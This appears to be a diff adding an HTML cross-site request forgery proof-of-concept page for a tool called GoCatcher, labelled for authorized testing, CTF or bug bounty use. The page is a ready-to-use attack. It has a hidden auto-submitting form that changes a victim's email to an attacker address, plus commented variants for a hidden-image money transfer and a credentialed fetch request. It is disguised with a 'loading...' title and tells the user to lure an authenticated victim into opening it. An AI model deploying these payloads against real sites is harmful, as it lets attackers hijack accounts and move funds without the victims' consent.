@@ -1,0 +1,37 @@
+<!doctype html>
+<!-- ===========================================================================
+     GoCatcher :: CSRF proof-of-concept  (text/html)
+     FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+
+     Host this page on GoCatcher (served at /csrf) and get the authenticated
+     victim to open it. It auto-submits a state-changing request to TARGET
+     using the victim's cookies. Change TARGET + fields to the real endpoint.
+
+     Confirm the forgery fired by pointing the action at GoCatcher first
+     (http://127.0.0.1:8080/csrf-hit) and watching the request log.
+     =========================================================================== -->
+<html>
+  <head><meta charset="utf-8"><title>loading...</title></head>
+  <body onload="document.forms['poc'].submit()">
+    <!-- POST-based CSRF (change email example) -->
+    <form id="poc" action="https://TARGET/account/update-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.test">
+      <input type="hidden" name="csrf_token" value="">
+    </form>
+
+    <!-- GET-based variant (uncomment to use instead):
+    <img src="https://TARGET/transfer?to=attacker&amount=1000" style="display:none">
+    -->
+
+    <!-- JSON / fetch variant (SameSite=None + CORS misconfig):
+    <script>
+      fetch("https://TARGET/api/account", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify({ email: "attacker@evil.test" })
+      });
+    </script>
+    -->
+  </body>
+</html>
